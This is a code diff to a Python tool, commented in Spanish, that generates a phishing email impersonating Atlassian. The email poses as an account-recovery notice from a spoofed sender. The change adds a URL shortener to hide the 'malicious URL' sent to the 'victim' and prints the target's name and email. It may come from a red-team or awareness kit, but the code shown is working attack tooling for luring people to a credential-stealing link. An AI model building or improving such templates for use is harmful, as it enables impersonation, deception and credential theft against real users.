@@ -2,11 +2,15 @@ import time
 import os
 import sys
 import smtplib
-from helper.helper import getPath,get_input_es,saveTemplateGenerated
+from helper.helper import get_input_es,saveTemplateGenerated,urlShorter
 
 def atlassian_es():
     
     userName,url,userEmail,currentDate=get_input_es()
+    print("\nGenerando suplantanción atalassian...")
+    print("\nLos datos de la victima usados para este ataque:\n[Usuario]:"+userName+"\n[Email]:"+userEmail)
+    urlShort=urlShorter(url+userName)
+    print("\n[Url Maliciosa]:"+url+userName+"\n[Url Acortada]:"+urlShort)
     
     ##HTML que se enviara a la victima
     atalasianHtml=("""
@@ -313,5 +317,5 @@ def atlassian_es():
     </tbody>
   </table>
 </div>
-                   """.format(userName,userEmail,url,userName,url,userName))
+                   """.format(userName,userEmail,urlShort,userName,urlShort,userName))
     saveTemplateGenerated(userName,"Attalasian",atalasianHtml,"Recuperación de tu cuenta Attalassian", "notificaciones@movicoders.link",userEmail)
